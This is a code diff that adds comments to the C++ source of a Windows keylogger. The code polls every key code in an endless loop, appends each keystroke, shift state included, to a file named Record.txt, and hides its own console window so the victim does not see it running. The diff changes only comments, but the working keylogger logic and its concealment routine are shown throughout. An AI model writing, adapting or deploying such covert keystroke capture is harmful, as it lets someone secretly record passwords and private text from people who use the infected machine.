@@ -5,13 +5,13 @@
 
 using namespace std;
 
-void log();
-void stealth();
+void log();         // function which records the keystrokes
+void stealth();     // function which makes the program invisible
 
 int main()
 {
 	stealth();
-	log();
+	log();              
 	return 0;
 }
 
@@ -19,23 +19,22 @@ void log()
 {
 	char key;
 
-	for(;;)
+	for(;;)           // creating an infinite loop
 	{
-		//sleep(0);
 		for( key = 8; key <= 222; key++)
 		{
-			if(GetAsyncKeyState(key) == -32767)
+			if(GetAsyncKeyState(key) == -32767)       // checking for an interrupt when a key is pressed from the keyboard
 			{
-				ofstream write("Record.txt", ios::app);
+				ofstream write("Record.txt", ios::app);    // creating Record.txt file an openning it in append mode
 
-				if( (key>64) && (key<91) && !(GetAsyncKeyState(0x10)))
+				if( (key>64) && (key<91) && !(GetAsyncKeyState(0x10)))    // checking for upper case without the shift key being pressed and converting it into lower case
 				{
 					key+=32;
 					write << key;
 					write.close();
 					break;
 				}
-				else if( (key>64) && (key<91) )
+				else if( (key>64) && (key<91) )    // checking for upper case again
 				{
 					write << key;
 					write.close();
@@ -43,11 +42,11 @@ void log()
 				}
 				else
 				{
-					switch(key)
+					switch(key)           // using switch case to check for numbers 0 to 9 as well as other characters assigned to the particular key
 					{
 						case 48:
 						{
-							if( GetAsyncKeyState(0x10) )
+							if( GetAsyncKeyState(0x10) )    // using GetAsyncKeyState to check for the shift key
 								write << ")";
 							else
 								write << "0";
@@ -125,6 +124,7 @@ void log()
 								write << "9";
 						}
 						break;
+						// using virtual keys to check for space, enter, tab, backspace, escape, delete and caps lock
 						case VK_SPACE:
 							write << " ";
 						break;
@@ -155,8 +155,8 @@ void log()
 
 void stealth()
 {
-	HWND invisible;
+	HWND invisible;    // initialising a handler
 	AllocConsole();
 	invisible=FindWindowA("ConsoleWindowClass",NULL);
-	ShowWindow(invisible,0);
+	ShowWindow(invisible,0);    // setting the parameter to 0 means that the window would not be visible.
 }
